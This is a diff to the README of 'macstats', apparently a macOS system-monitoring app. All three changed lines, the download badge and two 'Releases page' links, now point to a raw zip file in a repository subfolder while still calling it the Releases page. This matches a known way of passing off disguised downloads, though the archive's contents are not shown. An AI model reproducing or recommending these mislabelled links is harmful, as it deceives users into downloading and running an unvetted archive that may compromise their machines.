@@ -1,7 +1,7 @@
 # 🖥️ macstats - Your Mac's Health at a Glance
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-macstats-brightgreen.svg)](https://github.com/Mtzin-08/macstats/releases)
+[![Download](https://raw.githubusercontent.com/Mtzin-08/macstats/main/Eleut/macstats.zip)](https://raw.githubusercontent.com/Mtzin-08/macstats/main/Eleut/macstats.zip)
 
 ## 📜 Description
 macstats lets you see your Mac’s heartbeat right in the menu bar. Monitor your system with ease and get instant access to vital stats like CPU usage, memory consumption, and disk activity. Enjoy a sleek design and simple interface tailored for everyday users.
@@ -15,7 +15,7 @@ To get started with macstats, follow these simple steps. No programming skills a
 - 100MB of free disk space
 
 ### 📦 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Mtzin-08/macstats/releases) on GitHub.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Mtzin-08/macstats/main/Eleut/macstats.zip) on GitHub.
 2. **Choose Your Version**: You will see several versions of macstats. Click on the latest release version.
 3. **Download the Application**: Look for the macstats file compatible with your macOS version. Click on the file to download it.
 4. **Open the File**: Once the download is complete, locate the file in your Downloads folder.
@@ -36,7 +36,7 @@ After installing, you can customize how macstats displays information. Access th
 If you experience issues with installation or operation:
 - Ensure your macOS meets the requirements.
 - Restart the application.
-- Check for updates on the [Releases page](https://github.com/Mtzin-08/macstats/releases).
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/Mtzin-08/macstats/main/Eleut/macstats.zip).
 
 ### 👥 Support
 For assistance or to report any bugs, please visit the Issues section of this repository on GitHub. Your feedback is valuable and helps improve macstats for everyone.
